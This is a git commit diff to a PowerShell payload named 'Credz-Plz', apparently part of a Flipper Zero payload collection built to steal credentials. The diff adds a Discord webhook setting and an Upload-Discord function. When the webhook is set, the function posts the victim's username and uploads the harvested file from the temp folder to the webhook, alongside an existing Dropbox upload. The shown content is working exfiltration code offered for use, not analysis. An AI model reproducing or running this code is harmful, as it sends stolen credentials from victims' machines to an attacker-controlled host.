65156a7a2deb9d06667961cc93b638e450bc5780
I-Am-Jakoby <Michaelryanchitwood@gmail.com>
2022-12-18 22:10:08 -0600

    Update Credz-Plz.ps1

--- Payloads/Flip-Credz-Plz/Credz-Plz.ps1
+++ Payloads/Flip-Credz-Plz/Credz-Plz.ps1
@@ -34,7 +34,10 @@
 
 #------------------------------------------------------------------------------------------------------------------------------------
 # This is for if you want to host your own version of the script
+
 # $db = "YOUR-DROPBOX-ACCESS-TOKEN"
+
+# $dc = "YOUR-DISCORD-WEBHOOK"
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
@@ -160,6 +163,33 @@ Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Pos
 }
 
 if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TMP\$FileName}
+
+#------------------------------------------------------------------------------------------------------------------------------------
+
+function Upload-Discord {
+
+[CmdletBinding()]
+param (
+    [parameter(Position=0,Mandatory=$False)]
+    [string]$file,
+    [parameter(Position=1,Mandatory=$False)]
+    [string]$text 
+)
+
+$hookurl = "$dc"
+
+$Body = @{
+  'username' = $env:username
+  'content' = $text
+}
+
+if (-not ([string]::IsNullOrEmpty($text))){
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+}
+
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:TMP\$FileName}
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
